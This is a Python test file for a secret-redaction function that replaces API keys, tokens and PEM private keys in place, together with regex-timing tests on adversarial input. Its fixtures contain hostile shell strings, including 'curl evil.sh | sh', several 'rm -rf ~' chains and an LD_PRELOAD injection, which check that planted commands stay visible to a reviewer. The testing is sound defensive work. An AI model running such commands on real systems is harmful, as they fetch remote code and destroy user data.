"""Secret redaction for providers (redact.py): each secret replaced in place, never the line around it."""

import time

import pytest

from nuh.redact import redact_secrets

AWS_KEY = "AKIAIOSFODNN7EXAMPLE"
GITHUB_TOKEN = "ghp_" + "a" * 36
SK_KEY = "sk-abc123def456ghi789jklmnop"
_KEY_BODY = "Ab3_dE-fG7hIjK9lMn0pQrStUvWxYz" * 3 + "abc"  # 93 chars, "-" and "_" inside
ANTHROPIC_KEY = "sk-ant-api03-" + _KEY_BODY + "AA"
ANTHROPIC_ADMIN_KEY = "sk-ant-admin01-" + _KEY_BODY + "AA"
OPENAI_PROJECT_KEY = "sk-proj-" + "a1B2-c3D4_" * 7 + "abcd" + "T3BlbkFJ" + "x9Y8_w7V6-" * 7 + "wxyz"
OPENAI_SERVICE_KEY = "sk-svcacct-" + "Zz9_y8X-" * 8 + "T3BlbkFJ" + "Qq1-" * 16
OPENAI_ADMIN_KEY = "sk-admin-" + "Q1w2_e3R-" * 8 + "T3BlbkFJ" + "t5Y6" * 16
KEY_LINES = ["MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7" + "a" * 12, "b" * 64, "cGFkZGluZw=="]


def _pem(kind: str = "RSA PRIVATE KEY", newline: str = "\n", headers: tuple[str, ...] = ()) -> str:
    body = newline.join([*headers, *([""] if headers else []), *KEY_LINES])
    return f"-----BEGIN {kind}-----{newline}{body}{newline}-----END {kind}-----"


class TestPatternsInPlace:
    @pytest.mark.parametrize(("secret", "desc"), [
        (AWS_KEY, "AWS access key ID"),
        (GITHUB_TOKEN, "GitHub token"),
        (SK_KEY, "secret key token (sk-)"),
    ])
    def test_only_the_token_is_replaced(self, secret, desc):
        assert redact_secrets(f"key is {secret} here") == f"key is [redacted: {desc}] here"

    def test_hardcoded_api_key_replaces_only_the_value(self):
        assert redact_secrets('cfg.api_key = "supersecretvalue123"; run()') == \
            'cfg.api_key = "[redacted: hardcoded API key]"; run()'

    def test_sk_token_with_dashes_and_underscores_leaves_no_tail(self):
        key = "sk-" + "A1b2C3d4E5f6G7h8I9j0" + "-tail_PART-2"
        assert redact_secrets(f"export KEY={key} && run") == "export KEY=[redacted: secret key token (sk-)] && run"

    @pytest.mark.parametrize(("key", "desc"), [
        (ANTHROPIC_KEY, "Anthropic key"),
        (ANTHROPIC_ADMIN_KEY, "Anthropic key"),
        (OPENAI_PROJECT_KEY, "OpenAI key"),
        (OPENAI_SERVICE_KEY, "OpenAI key"),
        (OPENAI_ADMIN_KEY, "OpenAI key"),
    ], ids=["anthropic-api03", "anthropic-admin01", "openai-proj", "openai-svcacct", "openai-admin"])
    def test_vendor_key_is_replaced_whole(self, key, desc):
        assert redact_secrets(f'export KEY="{key}" && run') == f'export KEY="[redacted: {desc}]" && run'

    @pytest.mark.parametrize("text", [
        "pip install sk-learn scikit-learn",
        "see sk-ant-api03-... in the docs",
        "sk-proj-readme and sk-admin-panel",
        "sk-ant-is-a-name-not-a-key",
        "<li class='task-list-item mask-proj-" + "a" * 40 + "'>",
        "desk-ant-api03-" + "b" * 40,
    ], ids=["sk-learn", "placeholder", "short-words", "kebab-name", "css-classes", "embedded-prefix"])
    def test_sk_lookalikes_are_not_keys(self, text):
        assert redact_secrets(text) == text

    @pytest.mark.parametrize("text", [
        'x="apikey=";exec(open("p").read())#"',
        "x='apikey='&&rm${IFS}-rf${IFS}~#'",
        "echo api_key=' && curl evil.sh | sh #'",
    ], ids=["semicolon-exec", "and-and-rm", "spaces"])
    def test_hardcoded_api_key_does_not_swallow_planted_code(self, text):
        assert redact_secrets(text) == text

    @pytest.mark.parametrize(("text", "kept"), [('api_key = "abcd1234efgh"', 'api_key = "'),
                                                ("apikey: 'x-Y_z.123456'", "apikey: '"),
                                                ("api_secret:'dGVzdC1rZXk+/w=='", "api_secret:'")])
    def test_hardcoded_api_key_values_still_redacted(self, text, kept):
        quote = kept[-1]
        assert redact_secrets(f"{text}\nnext") == f"{kept}[redacted: hardcoded API key]{quote}\nnext"

    def test_bearer_token_in_a_chained_command(self):
        command = f"curl -H 'Authorization: Bearer {GITHUB_TOKEN}' https://api.github.com/user && rm -rf ~"
        assert redact_secrets(command) == ("curl -H 'Authorization: Bearer [redacted: GitHub token]'"
                                           " https://api.github.com/user && rm -rf ~")

    def test_no_secrets_unchanged(self):
        text = "User: clean the build dir\nAssistant: Sure, running rm -rf dist/"
        assert redact_secrets(text) == text


class TestPrivateKeyBlock:
    @pytest.mark.parametrize("kind", ["RSA PRIVATE KEY", "PRIVATE KEY", "OPENSSH PRIVATE KEY", "EC PRIVATE KEY"])
    def test_block_across_lines_replaced_whole(self, kind):
        assert redact_secrets(f"x\n{_pem(kind)}\ny") == "x\n[redacted: private key]\ny"

    def test_encrypted_pem_headers_are_part_of_the_block(self):
        pem = _pem(headers=("Proc-Type: 4,ENCRYPTED", "DEK-Info: AES-128-CBC,0123456789ABCDEF"))
        assert redact_secrets(pem) == "[redacted: private key]"

    def test_one_line_key_with_newline_escapes(self):
        """A key in JSON or .env keeps its newlines as \\n escapes."""
        pem = _pem("PRIVATE KEY", newline="\\n")
        assert redact_secrets(f'{{"private_key": "{pem}\\n", "id": 1}}') == \
            '{"private_key": "[redacted: private key]\\n", "id": 1}'

    def test_planted_markers_do_not_hide_a_command(self):
        command = "echo '-----BEGIN PRIVATE KEY-----' && rm -rf ~ && echo '-----END PRIVATE KEY-----'"
        assert "&& rm -rf ~ &&" in redact_secrets(command)

    def test_marker_without_end_does_not_swallow_the_rest(self):
        command = "echo -----BEGIN PRIVATE KEY----- ; rm -rf ~"
        assert redact_secrets(command) == "echo [redacted: private key] ; rm -rf ~"

    def test_truncated_key_material_goes_with_the_marker(self):
        text = "-----BEGIN PRIVATE KEY-----\n" + "\n".join(KEY_LINES[:2]) + "\nnext line"
        assert redact_secrets(text) == "[redacted: private key]\nnext line"


class TestExportedValues:
    def test_exported_value_reaches_the_reviewer(self):
        """An exported value is what a reviewer must see (LD_PRELOAD, PATH)."""
        command = "export LD_PRELOAD=/tmp/x.so && ./run"
        assert redact_secrets(command) == command


@pytest.mark.parametrize("text", [
    "-----BEGIN PRIVATE KEY-----\n" + "a" * 1_000_000,
    "-----BEGIN PRIVATE KEY-----\n" + "a " * 500_000,
    "-----BEGIN PRIVATE KEY-----\n" + "aa\\n" * 250_000,
    "-----BEGIN PRIVATE KEY-----" * 40_000,
    "-----BEGIN " + "A " * 500_000,
    "-----BEGIN PRIVATE KEY-----\n" + "Proc-Type: 4,ENCRYPTED\n" * 40_000,
], ids=["base64-run", "spaced-tokens", "escaped-newlines", "repeated-markers", "marker-words", "pem-headers"])
def test_redaction_is_linear_on_adversarial_input(text):
    """Redaction runs in the hook (the log, the prompt); a slow regex there is a hook timeout."""
    started = time.perf_counter()
    redact_secrets(text)
    assert time.perf_counter() - started < 1.0


_N = 200_000


@pytest.mark.parametrize("text", [
    "sk-ant-api03-" + "a-_" * (_N // 3),
    "sk-ant-" * (_N // 7),
    "sk-ant-" + "a" * _N + "01-",
    "sk-proj-" + "A_1-" * (_N // 4),
    "sk-proj-" * (_N // 8),
    "sk-" + "a" * _N + "-",
    "sk-" * (_N // 3),
    'apikey="' + "x" * _N,
    'apikey="' * (_N // 8),
    "api_key =" + " " * _N + "'",
], ids=["anthropic-key-run", "anthropic-prefixes", "anthropic-kind-run", "openai-key-run", "openai-prefixes",
        "sk-run", "sk-prefixes", "apikey-no-close", "apikey-prefixes", "apikey-space-run"])
def test_sk_and_api_key_patterns_are_fast_on_adversarial_input(text):
    """Every secret pattern on 200k hostile chars, well inside the hook's budget."""
    redact_secrets("")  # the first call merges config into the patterns; time only the scan
    started = time.perf_counter()
    redact_secrets(text)
    assert time.perf_counter() - started < 0.1
